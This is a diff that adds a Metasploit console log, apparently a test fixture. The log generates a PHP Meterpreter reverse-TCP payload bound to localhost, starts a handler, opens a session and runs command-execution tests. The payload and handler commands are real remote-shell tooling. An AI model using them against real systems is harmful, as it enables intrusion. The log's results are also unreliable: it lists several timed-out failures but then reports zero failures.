@@ -1,0 +1,44 @@
+use php/meterpreter_reverse_tcp
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> generate -o /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220205-3277-ejpvs.php -f raw AutoVerifySessionTimeout=10 lport=6001 lhost=127.0.0.1
+[*] Writing 34276 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220205-3277-ejpvs.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:59582 ) at 2022-02-05 19:49:35 +0000
+use test/cmd_exec
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> run session=1 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_railgun_api
+[*] Running against session 1
+[*] Session type is meterpreter and platform is linux
+[*] Starting cmd_exec tests
+before running test: should return the result of echo
+expected: wZiR - [119, 90, 105, 82] - ASCII-8BIT
+actual: wZiR - [119, 90, 105, 82] - ASCII-8BIT
+[+] should return the result of echo
+before running test: should return the full response after sleeping
+[-] FAILED: should return the full response after sleeping
+[-] Exception: Rex::TimeoutError : Operation timed out.
+before running test: should return the full response after sleeping
+[-] FAILED: should return the full response after sleeping
+[-] Exception: Rex::TimeoutError : Operation timed out.
+before running test: should return the result of echo 10 times
+[-] FAILED: should return the result of echo 10 times
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Finished cmd_exec tests
+[*] Starting cmd_exec quote tests
+before running test: should return the result of echo with single quotes
+[-] FAILED: should return the result of echo with single quotes
+[-] Exception: Rex::TimeoutError : Operation timed out.
+before running test: should return the result of echo with double quotes
+[-] FAILED: should return the result of echo with double quotes
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Starting cmd_exec stderr tests
+before running test: should return the stderr output
+[-] FAILED: should return the stderr output
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Testing complete in 0.231607024
+[*] Passed: 7; Failed: 0
+[*] Post module execution completed
